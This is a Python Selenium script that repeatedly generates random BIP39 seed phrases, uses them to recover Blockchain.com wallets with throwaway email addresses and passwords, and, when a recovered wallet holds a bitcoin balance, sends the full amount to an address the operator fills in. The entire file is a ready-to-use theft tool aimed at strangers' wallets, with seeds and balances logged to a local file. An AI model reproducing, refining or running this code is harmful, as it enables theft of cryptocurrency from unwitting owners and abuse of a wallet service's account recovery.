from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import InvalidSessionIdException
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium import webdriver
import win32clipboard
import datetime
import time

#///////////////////////////////////////////////////////////////////////////////////////
BitcoinWallet = "PUT YOUR WALLET IN HERE!"#Blockchain Bitcoin Address(DO NOT REMOVE ""!)//
#/////////////////////////////////////////////////////////////////////////////////////

def get_time():
    date, time = str(datetime.datetime.now()).split()
    return f'[{date}] [{time}]'


while True:
    try:
        print(" ")
        print("Loading...")
        
        #////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        time.sleep(2)#If you still get connection error make this number higher! If you never get the error lower this number!//
        #//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
        print("Loaded!")
        driver = webdriver.Chrome()
        driver.get('https://iancoleman.io/bip39/#english')
        driver.wait = WebDriverWait(driver, 3)

        dropList = driver.find_element_by_xpath('//*[@id="strength"]/option[4]')
        dropList.click()

        generateButton = driver.find_element_by_xpath('/html/body/div[1]/div[1]/div/form/div[2]/div/div/div/button')
        generateButton.click()

        element = driver.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="phrase"]')))
        time.sleep(1)
        element.send_keys(Keys.CONTROL, 'a')
        time.sleep(1)
        element.send_keys(Keys.CONTROL, 'c')

        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()


        with open('output.txt', 'a') as output:
            output.write(f'{get_time()} [BIP39 MNEMONIC]: {data}\n')
        print("Succesfully logged.")
        driver.quit()
    except:
        print("Unsuccesfully logged.")
        driver.quit()

    try:
        driver2 = webdriver.Chrome()
        driver2.get('https://login.blockchain.com/#/recover')
        driver2.wait = WebDriverWait(driver2, 3)

        time.sleep(1)
        element2 = driver2.find_element_by_xpath('//*[@id="app"]/div/div[3]/div[2]/div[1]/form/div[2]/div/div[2]/div[1]/input')
        element2.send_keys(Keys.CONTROL, 'v')

        continueButton = driver2.find_element_by_xpath('//*[@id="app"]/div/div[3]/div[2]/div[1]/form/div[3]/button')
        continueButton.click()
        print("Succesfully recovered!")
    except:
        driver2.close()

    try:
        driver3 = webdriver.Chrome()
        driver3.get('https://temp-mail.io/en')

        getButton = driver3.find_element_by_xpath('//*[@id="__layout"]/div/header/div[3]/button[3]')
        time.sleep(1)
        getButton.click()

        copyButton = driver3.find_element_by_xpath('//*[@id="__layout"]/div/header/div[3]/button[1]')
        time.sleep(1)
        copyButton.click()

        driver3.quit()
    except:
        driver2.close()
        driver3.quit()

    try:
        Email = driver2.find_element_by_xpath('//*[@id="app"]/div/div[3]/div[2]/div[1]/form/div[1]/div/div[1]/input')
        time.sleep(1)
        Email.send_keys(Keys.CONTROL, 'v')
    except:
        driver2.close()
        driver3.quit()

    try:
        driver4 = webdriver.Chrome()
        driver4.get('https://passwordsgenerator.net/')

        genButton = driver4.find_element_by_xpath('//*[@id="sec_btn"]/div[1]')
        genButton.click()

        PasswordBox = driver4.find_element_by_xpath('//*[@id="final_pass"]')
        time.sleep(1)
        PasswordBox.send_keys(Keys.CONTROL, 'a')
        time.sleep(1)
        PasswordBox.send_keys(Keys.CONTROL, 'c')

        driver4.quit()
    except:
        driver2.close()
        driver3.quit()
        driver4.quit()

    try:
        Password = driver2.find_element_by_xpath('//*[@id="app"]/div/div[3]/div[2]/div[1]/form/div[2]/div/input')
        Password.send_keys(Keys.CONTROL, 'v')
        Password2 = driver2.find_element_by_xpath('//*[@id="app"]/div/div[3]/div[2]/div[1]/form/div[3]/div/input')
        Password2.send_keys(Keys.CONTROL, 'v')

        recoverButton = driver2.find_element_by_xpath('//*[@id="app"]/div/div[3]/div[2]/div[1]/form/div[5]/button')
        time.sleep(1)
        recoverButton.click()
        print("Succesfully recovered account!")
    except:
        print("Timeout: recovering failed, closing...")
        driver2.close()
        print("Closed!")
			
    try:
        try:
            try:
                time.sleep(10)
                skipButton = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[3]/div/div/div/div/div/span/div/div[3]/button[2]')))
                skipButton.click()
                
                time.sleep(5)
                
                dropButton = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[5]/div[1]/div[1]/div[2]/div/div/span')))
                dropButton.click()

                currency = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[5]/div[1]/div[1]/div[2]/div/ul/li[1]/div/div[2]/div[2]/div/div[2]/div')))
                currencyString = currency.text

                try:
                    with open('output.txt', 'a') as output2:
                        output2.write(f'{get_time()} [BITCOIN]: {currency.text}\n')
                        time.sleep(1)
                        print("Successfully logged.")
                        time.sleep(2)
                except:
                     print("Timeout: Unsuccesfully logged, closing...")
                     driver2.close()
                     print("Closed!")
                
                sendButton = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[4]/div[1]/div/div/div[2]/div/button[1]')))
                time.sleep(1)
                sendButton.click()
                bitcoinAddress = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="react-select-5-input"]')))
                
                bitcoinAddress.send_keys(BitcoinWallet)
                
                amountMoney = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[3]/div/div/div/div/div[2]/form/div[4]/div/div/div[1]/div[1]/div/input')))
                amountMoney.send_keys(currencyString)

                try:
                    conButton = driver2.wait.until(EC.element_to_be_clickable((By.XPATH,'//*[@id="app"]/div/div[3]/div/div/div/div/div[2]/form/div[8]/button')))
                    conButton.click()
                    print("Bitcoin succesfully sent to your account!")
                    print("Closing...")
                    
                    #////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                    time.sleep(2)#If you still get connection error make this number higher! If you never get the error lower this number!//
                    #//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                    
                    driver2.close()
                    print("Closed!")
                except:
                    print("Timeout: No Bitcoin found on account.")
                    print("Closing...")
                    
                    #////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                    time.sleep(2)#If you still get connection error make this number higher! If you never get the error lower this number!//
                    #//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                    
                    print("Closed!")
                    driver2.close()
                
            except:
                dropButton = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[5]/div[1]/div[1]/div[2]/div/div/span')))
                dropButton.click()

                currency = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[5]/div[1]/div[1]/div[2]/div/ul/li[1]/div/div[2]/div[2]/div/div[2]/div')))
                currencyString = currency.text

                try:
                    with open('output.txt', 'a') as output2:
                        output2.write(f'{get_time()} [BITCOIN]: {currency.text}\n')
                        time.sleep(1)
                        print("Successfully logged.")
                        time.sleep(2)
                except:
                     print("Timeout: Unsuccesfully logged.")
                     print("Closing")
                     driver2.close()
                     print("Closed!")
                
                sendButton = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[4]/div[1]/div/div/div[2]/div/button[1]')))
                time.sleep(1)
                sendButton.click()
                bitcoinAddress = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="react-select-5-input"]')))
                
                bitcoinAddress.send_keys(BitcoinWallet)
                
                amountMoney = driver2.wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div[3]/div/div/div/div/div[2]/form/div[4]/div/div/div[1]/div[1]/div/input')))
                amountMoney.send_keys(currencyString)
                conButton = driver2.wait.until(EC.element_to_be_clickable((By.XPATH,'//*[@id="app"]/div/div[3]/div/div/div/div/div[2]/form/div[8]/button')))
                conButton.click()
                print("Bitcoin succesfully sent to your account!")
                print("Closing...")
                
                #////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                time.sleep(2)#If you still get connection error make this number higher! If you never get the error lower this number!//
                #//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                
                driver2.close()
                print("Closed!")
                
        except:
            driver2.close()

    except TimeoutException:
           print("Timeout, closing...")
           time.sleep(1)
           driver2.close()
           continue
    
    except Exception as e:
            driver2.close()
            if isinstance(e, InvalidSessionIdException): continue
            raise
